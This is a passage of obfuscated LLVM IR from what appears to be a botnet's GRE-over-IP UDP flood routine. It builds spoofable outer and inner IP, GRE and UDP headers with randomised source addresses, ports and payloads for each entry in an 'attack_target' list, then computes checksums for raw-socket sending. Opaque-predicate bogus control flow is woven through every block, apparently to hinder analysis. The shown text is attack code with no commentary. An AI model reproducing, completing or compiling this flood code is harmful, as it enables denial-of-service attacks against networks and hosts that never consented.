  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %12, align 4
  %94 = call i32 @close(i32 %93)
  br label %659

; <label>:95:                                     ; preds = %87
  %96 = load i32, i32* @x.19
  %97 = load i32, i32* @y.20
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %95
  store i32 0, i32* %11, align 4
  %104 = load i32, i32* @x.19
  %105 = load i32, i32* @y.20
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %112

; <label>:112:                                    ; preds = %310, %originalBBpart2
  %113 = load i32, i32* @x.19
  %114 = load i32, i32* @y.20
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %112
  %121 = load i32, i32* %11, align 4
  %122 = load i8, i8* %7, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %121, %123
  %125 = load i32, i32* @x.19
  %126 = load i32, i32* @y.20
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %124, label %133, label %313

; <label>:133:                                    ; preds = %originalBBpart24
  %134 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %135 = load i8**, i8*** %13, align 8
  %136 = load i32, i32* %11, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8*, i8** %135, i64 %137
  store i8* %134, i8** %138, align 8
  %139 = load i8**, i8*** %13, align 8
  %140 = load i32, i32* %11, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8*, i8** %139, i64 %141
  %143 = load i8*, i8** %142, align 8
  %144 = bitcast i8* %143 to %struct.iphdr*
  store %struct.iphdr* %144, %struct.iphdr** %25, align 8
  %145 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i64 1
  %147 = bitcast %struct.iphdr* %146 to %struct.grehdr*
  store %struct.grehdr* %147, %struct.grehdr** %26, align 8
  %148 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %149 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %148, i64 1
  %150 = bitcast %struct.grehdr* %149 to %struct.iphdr*
  store %struct.iphdr* %150, %struct.iphdr** %27, align 8
  %151 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i64 1
  %153 = bitcast %struct.iphdr* %152 to %struct.udphdr*
  store %struct.udphdr* %153, %struct.udphdr** %28, align 8
  %154 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %155 = bitcast %struct.iphdr* %154 to i8*
  %156 = load i8, i8* %155, align 4
  %157 = and i8 %156, 15
  %158 = or i8 %157, 64
  store i8 %158, i8* %155, align 4
  %159 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %160 = bitcast %struct.iphdr* %159 to i8*
  %161 = load i8, i8* %160, align 4
  %162 = and i8 %161, -16
  %163 = or i8 %162, 5
  store i8 %163, i8* %160, align 4
  %164 = load i8, i8* %14, align 1
  %165 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 1
  store i8 %164, i8* %166, align 1
  %167 = load i32, i32* %20, align 4
  %168 = sext i32 %167 to i64
  %169 = add i64 52, %168
  %170 = trunc i64 %169 to i16
  %171 = call zeroext i16 @htons(i16 zeroext %170) #7
  %172 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 2
  store i16 %171, i16* %173, align 2
  %174 = load i16, i16* %15, align 2
  %175 = call zeroext i16 @htons(i16 zeroext %174) #7
  %176 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 3
  store i16 %175, i16* %177, align 4
  %178 = load i8, i8* %16, align 1
  %179 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 5
  store i8 %178, i8* %180, align 4
  %181 = load i8, i8* %17, align 1
  %182 = icmp ne i8 %181, 0
  br i1 %182, label %183, label %203

; <label>:183:                                    ; preds = %133
  %184 = load i32, i32* @x.19
  %185 = load i32, i32* @y.20
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %183
  %192 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %193 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 4
  store i16 %192, i16* %194, align 2
  %195 = load i32, i32* @x.19
  %196 = load i32, i32* @y.20
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %203

; <label>:203:                                    ; preds = %originalBBpart28, %133
  %204 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 6
  store i8 47, i8* %205, align 1
  %206 = load i32, i32* %23, align 4
  %207 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 8
  store i32 %206, i32* %208, align 4
  %209 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %210 = load i32, i32* %11, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %209, i64 %211
  %213 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %212, i32 0, i32 1
  %214 = load i32, i32* %213, align 4
  %215 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 9
  store i32 %214, i32* %216, align 4
  %217 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %218 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %219 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %218, i32 0, i32 1
  store i16 %217, i16* %219, align 2
  %220 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %221 = bitcast %struct.iphdr* %220 to i8*
  %222 = load i8, i8* %221, align 4
  %223 = and i8 %222, 15
  %224 = or i8 %223, 64
  store i8 %224, i8* %221, align 4
  %225 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %226 = bitcast %struct.iphdr* %225 to i8*
  %227 = load i8, i8* %226, align 4
  %228 = and i8 %227, -16
  %229 = or i8 %228, 5
  store i8 %229, i8* %226, align 4
  %230 = load i8, i8* %14, align 1
  %231 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 1
  store i8 %230, i8* %232, align 1
  %233 = load i32, i32* %20, align 4
  %234 = sext i32 %233 to i64
  %235 = add i64 28, %234
  %236 = trunc i64 %235 to i16
  %237 = call zeroext i16 @htons(i16 zeroext %236) #7
  %238 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %239 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %238, i32 0, i32 2
  store i16 %237, i16* %239, align 2
  %240 = load i16, i16* %15, align 2
  %241 = zext i16 %240 to i32
  %242 = xor i32 %241, -1
  %243 = trunc i32 %242 to i16
  %244 = call zeroext i16 @htons(i16 zeroext %243) #7
  %245 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 3
  store i16 %244, i16* %246, align 4
  %247 = load i8, i8* %16, align 1
  %248 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %249 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %248, i32 0, i32 5
  store i8 %247, i8* %249, align 4
  %250 = load i8, i8* %17, align 1
  %251 = icmp ne i8 %250, 0
  br i1 %251, label %252, label %256

; <label>:252:                                    ; preds = %203
  %253 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %254 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %255 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %254, i32 0, i32 4
  store i16 %253, i16* %255, align 2
  br label %256

; <label>:256:                                    ; preds = %252, %203
  %257 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 6
  store i8 17, i8* %258, align 1
  %259 = call i32 @rand_next()
  %260 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 8
  store i32 %259, i32* %261, align 4
  %262 = load i8, i8* %22, align 1
  %263 = icmp ne i8 %262, 0
  br i1 %263, label %264, label %270

; <label>:264:                                    ; preds = %256
  %265 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 9
  %267 = load i32, i32* %266, align 4
  %268 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 9
  store i32 %267, i32* %269, align 4
  br label %278

; <label>:270:                                    ; preds = %256
  %271 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 8
  %273 = load i32, i32* %272, align 4
  %274 = sub i32 %273, 1024
  %275 = xor i32 %274, -1
  %276 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 9
  store i32 %275, i32* %277, align 4
  br label %278

; <label>:278:                                    ; preds = %270, %264
  %279 = load i32, i32* @x.19
  %280 = load i32, i32* @y.20
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %278
  %287 = load i16, i16* %18, align 2
  %288 = call zeroext i16 @htons(i16 zeroext %287) #7
  %289 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %290 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %289, i32 0, i32 0
  store i16 %288, i16* %290, align 2
  %291 = load i16, i16* %19, align 2
  %292 = call zeroext i16 @htons(i16 zeroext %291) #7
  %293 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %294 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %293, i32 0, i32 1
  store i16 %292, i16* %294, align 2
  %295 = load i32, i32* %20, align 4
  %296 = sext i32 %295 to i64
  %297 = add i64 8, %296
  %298 = trunc i64 %297 to i16
  %299 = call zeroext i16 @htons(i16 zeroext %298) #7
  %300 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %301 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %300, i32 0, i32 2
  store i16 %299, i16* %301, align 2
  %302 = load i32, i32* @x.19
  %303 = load i32, i32* @y.20
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBBpart217, label %originalBB10alteredBB

originalBBpart217:                                ; preds = %originalBB10
  br label %310

; <label>:310:                                    ; preds = %originalBBpart217
  %311 = load i32, i32* %11, align 4
  %312 = add nsw i32 %311, 1
  store i32 %312, i32* %11, align 4
  br label %112

; <label>:313:                                    ; preds = %originalBBpart24
  %314 = load i32, i32* @x.19
  %315 = load i32, i32* @y.20
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %313
  %322 = load i32, i32* @x.19
  %323 = load i32, i32* @y.20
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %330

; <label>:330:                                    ; preds = %originalBBpart272, %originalBBpart221
  store i32 0, i32* %11, align 4
  br label %331

; <label>:331:                                    ; preds = %633, %330
  %332 = load i32, i32* %11, align 4
  %333 = load i8, i8* %7, align 1
  %334 = zext i8 %333 to i32
  %335 = icmp slt i32 %332, %334
  br i1 %335, label %336, label %636

; <label>:336:                                    ; preds = %331
  %337 = load i8**, i8*** %13, align 8
  %338 = load i32, i32* %11, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds i8*, i8** %337, i64 %339
  %341 = load i8*, i8** %340, align 8
  store i8* %341, i8** %29, align 8
  %342 = load i8*, i8** %29, align 8
  %343 = bitcast i8* %342 to %struct.iphdr*
  store %struct.iphdr* %343, %struct.iphdr** %30, align 8
  %344 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %345 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %344, i64 1
  %346 = bitcast %struct.iphdr* %345 to %struct.grehdr*
  store %struct.grehdr* %346, %struct.grehdr** %31, align 8
  %347 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %348 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %347, i64 1
  %349 = bitcast %struct.grehdr* %348 to %struct.iphdr*
  store %struct.iphdr* %349, %struct.iphdr** %32, align 8
  %350 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i64 1
  %352 = bitcast %struct.iphdr* %351 to %struct.udphdr*
  store %struct.udphdr* %352, %struct.udphdr** %33, align 8
  %353 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %354 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %353, i64 1
  %355 = bitcast %struct.udphdr* %354 to i8*
  store i8* %355, i8** %34, align 8
  %356 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %357 = load i32, i32* %11, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %356, i64 %358
  %360 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %359, i32 0, i32 2
  %361 = load i8, i8* %360, align 4
  %362 = zext i8 %361 to i32
  %363 = icmp slt i32 %362, 32
  br i1 %363, label %364, label %401

; <label>:364:                                    ; preds = %336
  %365 = load i32, i32* @x.19
  %366 = load i32, i32* @y.20
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %364
  %373 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %374 = load i32, i32* %11, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %376, i32 0, i32 1
  %378 = load i32, i32* %377, align 4
  %379 = call i32 @ntohl(i32 %378) #7
  %380 = call i32 @rand_next()
  %381 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %382 = load i32, i32* %11, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %384, i32 0, i32 2
  %386 = load i8, i8* %385, align 4
  %387 = zext i8 %386 to i32
  %388 = lshr i32 %380, %387
  %389 = add i32 %379, %388
  %390 = call i32 @htonl(i32 %389) #7
  %391 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %392 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %391, i32 0, i32 9
  store i32 %390, i32* %392, align 4
  %393 = load i32, i32* @x.19
  %394 = load i32, i32* @y.20
  %395 = sub i32 %393, 1
  %396 = mul i32 %393, %395
  %397 = urem i32 %396, 2
  %398 = icmp eq i32 %397, 0
  %399 = icmp slt i32 %394, 10
  %400 = or i1 %398, %399
  br i1 %400, label %originalBBpart239, label %originalBB23alteredBB

originalBBpart239:                                ; preds = %originalBB23
  br label %401

; <label>:401:                                    ; preds = %originalBBpart239, %336
  %402 = load i32, i32* %23, align 4
  %403 = icmp eq i32 %402, -1
  br i1 %403, label %404, label %408

; <label>:404:                                    ; preds = %401
  %405 = call i32 @rand_next()
  %406 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %407 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %406, i32 0, i32 8
  store i32 %405, i32* %407, align 4
  br label %408

; <label>:408:                                    ; preds = %404, %401
  %409 = load i32, i32* @x.19
  %410 = load i32, i32* @y.20
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %408
  %417 = load i16, i16* %15, align 2
  %418 = zext i16 %417 to i32
  %419 = icmp eq i32 %418, 65535
  %420 = load i32, i32* @x.19
  %421 = load i32, i32* @y.20
  %422 = sub i32 %420, 1
  %423 = mul i32 %420, %422
  %424 = urem i32 %423, 2
  %425 = icmp eq i32 %424, 0
  %426 = icmp slt i32 %421, 10
  %427 = or i1 %425, %426
  br i1 %427, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %419, label %428, label %443

; <label>:428:                                    ; preds = %originalBBpart243
  %429 = call i32 @rand_next()
  %430 = and i32 %429, 65535
  %431 = trunc i32 %430 to i16
  %432 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %433 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %432, i32 0, i32 3
  store i16 %431, i16* %433, align 4
  %434 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %435 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %434, i32 0, i32 3
  %436 = load i16, i16* %435, align 4
  %437 = zext i16 %436 to i32
  %438 = sub nsw i32 %437, 1000
  %439 = xor i32 %438, -1
  %440 = trunc i32 %439 to i16
  %441 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %442 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %441, i32 0, i32 3
  store i16 %440, i16* %442, align 4
  br label %443

; <label>:443:                                    ; preds = %428, %originalBBpart243
  %444 = load i32, i32* @x.19
  %445 = load i32, i32* @y.20
  %446 = sub i32 %444, 1
  %447 = mul i32 %444, %446
  %448 = urem i32 %447, 2
  %449 = icmp eq i32 %448, 0
  %450 = icmp slt i32 %445, 10
  %451 = or i1 %449, %450
  br i1 %451, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %443
  %452 = load i16, i16* %18, align 2
  %453 = zext i16 %452 to i32
  %454 = icmp eq i32 %453, 65535
  %455 = load i32, i32* @x.19
  %456 = load i32, i32* @y.20
  %457 = sub i32 %455, 1
  %458 = mul i32 %455, %457
  %459 = urem i32 %458, 2
  %460 = icmp eq i32 %459, 0
  %461 = icmp slt i32 %456, 10
  %462 = or i1 %460, %461
  br i1 %462, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br i1 %454, label %463, label %469

; <label>:463:                                    ; preds = %originalBBpart247
  %464 = call i32 @rand_next()
  %465 = and i32 %464, 65535
  %466 = trunc i32 %465 to i16
  %467 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %468 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %467, i32 0, i32 0
  store i16 %466, i16* %468, align 2
  br label %469

; <label>:469:                                    ; preds = %463, %originalBBpart247
  %470 = load i16, i16* %19, align 2
  %471 = zext i16 %470 to i32
  %472 = icmp eq i32 %471, 65535
  br i1 %472, label %473, label %495

; <label>:473:                                    ; preds = %469
  %474 = load i32, i32* @x.19
  %475 = load i32, i32* @y.20
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %473
  %482 = call i32 @rand_next()
  %483 = and i32 %482, 65535
  %484 = trunc i32 %483 to i16
  %485 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %486 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %485, i32 0, i32 1
  store i16 %484, i16* %486, align 2
  %487 = load i32, i32* @x.19
  %488 = load i32, i32* @y.20
  %489 = sub i32 %487, 1
  %490 = mul i32 %487, %489
  %491 = urem i32 %490, 2
  %492 = icmp eq i32 %491, 0
  %493 = icmp slt i32 %488, 10
  %494 = or i1 %492, %493
  br i1 %494, label %originalBBpart256, label %originalBB49alteredBB

originalBBpart256:                                ; preds = %originalBB49
  br label %495

; <label>:495:                                    ; preds = %originalBBpart256, %469
  %496 = load i8, i8* %22, align 1
  %497 = icmp ne i8 %496, 0
  br i1 %497, label %518, label %498

; <label>:498:                                    ; preds = %495
  %499 = load i32, i32* @x.19
  %500 = load i32, i32* @y.20
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %498
  %507 = call i32 @rand_next()
  %508 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %509 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %508, i32 0, i32 9
  store i32 %507, i32* %509, align 4
  %510 = load i32, i32* @x.19
  %511 = load i32, i32* @y.20
  %512 = sub i32 %510, 1
  %513 = mul i32 %510, %512
  %514 = urem i32 %513, 2
  %515 = icmp eq i32 %514, 0
  %516 = icmp slt i32 %511, 10
  %517 = or i1 %515, %516
  br i1 %517, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %540

; <label>:518:                                    ; preds = %495
  %519 = load i32, i32* @x.19
  %520 = load i32, i32* @y.20
  %521 = sub i32 %519, 1
  %522 = mul i32 %519, %521
  %523 = urem i32 %522, 2
  %524 = icmp eq i32 %523, 0
  %525 = icmp slt i32 %520, 10
  %526 = or i1 %524, %525
  br i1 %526, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %518
  %527 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %528 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %527, i32 0, i32 9
  %529 = load i32, i32* %528, align 4
  %530 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %531 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %530, i32 0, i32 9
  store i32 %529, i32* %531, align 4
  %532 = load i32, i32* @x.19
  %533 = load i32, i32* @y.20
  %534 = sub i32 %532, 1
  %535 = mul i32 %532, %534
  %536 = urem i32 %535, 2
  %537 = icmp eq i32 %536, 0
  %538 = icmp slt i32 %533, 10
  %539 = or i1 %537, %538
  br i1 %539, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %540

; <label>:540:                                    ; preds = %originalBBpart264, %originalBBpart260
  %541 = load i32, i32* @x.19
  %542 = load i32, i32* @y.20
  %543 = sub i32 %541, 1
  %544 = mul i32 %541, %543
  %545 = urem i32 %544, 2
  %546 = icmp eq i32 %545, 0
  %547 = icmp slt i32 %542, 10
  %548 = or i1 %546, %547
  br i1 %548, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %540
  %549 = load i8, i8* %21, align 1
  %550 = icmp ne i8 %549, 0
  %551 = load i32, i32* @x.19
  %552 = load i32, i32* @y.20
  %553 = sub i32 %551, 1
  %554 = mul i32 %551, %553
  %555 = urem i32 %554, 2
  %556 = icmp eq i32 %555, 0
  %557 = icmp slt i32 %552, 10
  %558 = or i1 %556, %557
  br i1 %558, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %550, label %559, label %566

; <label>:559:                                    ; preds = %originalBBpart268
  %560 = load i8*, i8** %34, align 8
  %561 = load i32, i32* %20, align 4
  call void @rand_alpha_str(i8* %560, i32 %561)
  %562 = load i8*, i8** %34, align 8
  %563 = load i32, i32* %20, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds i8, i8* %562, i64 %564
  store i8 0, i8* %565, align 1
  br label %566

; <label>:566:                                    ; preds = %559, %originalBBpart268
  %567 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %568 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %567, i32 0, i32 7
  store i16 0, i16* %568, align 2
  %569 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %570 = bitcast %struct.iphdr* %569 to i16*
  %571 = call zeroext i16 @checksum_generic(i16* %570, i32 20)
  %572 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %573 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %572, i32 0, i32 7
  store i16 %571, i16* %573, align 2
  %574 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %575 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %574, i32 0, i32 7
  store i16 0, i16* %575, align 2
  %576 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %577 = bitcast %struct.iphdr* %576 to i16*
  %578 = call zeroext i16 @checksum_generic(i16* %577, i32 20)
  %579 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %580 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %579, i32 0, i32 7
  store i16 %578, i16* %580, align 2
  %581 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %582 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %581, i32 0, i32 3
  store i16 0, i16* %582, align 2
  %583 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %584 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %585 = bitcast %struct.udphdr* %584 to i8*
  %586 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %587 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %586, i32 0, i32 2
  %588 = load i16, i16* %587, align 2
  %589 = load i32, i32* %20, align 4
  %590 = sext i32 %589 to i64
  %591 = add i64 8, %590
  %592 = trunc i64 %591 to i32
  %593 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %583, i8* %585, i16 zeroext %588, i32 %592)
  %594 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %595 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %594, i32 0, i32 3
  store i16 %593, i16* %595, align 2
  %596 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %597 = load i32, i32* %11, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %596, i64 %598
  %600 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %599, i32 0, i32 0
  %601 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %600, i32 0, i32 0
  store i16 2, i16* %601, align 4
  %602 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %603 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %602, i32 0, i32 9
  %604 = load i32, i32* %603, align 4
  %605 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %606 = load i32, i32* %11, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %605, i64 %607
  %609 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %608, i32 0, i32 0
  %610 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %609, i32 0, i32 2
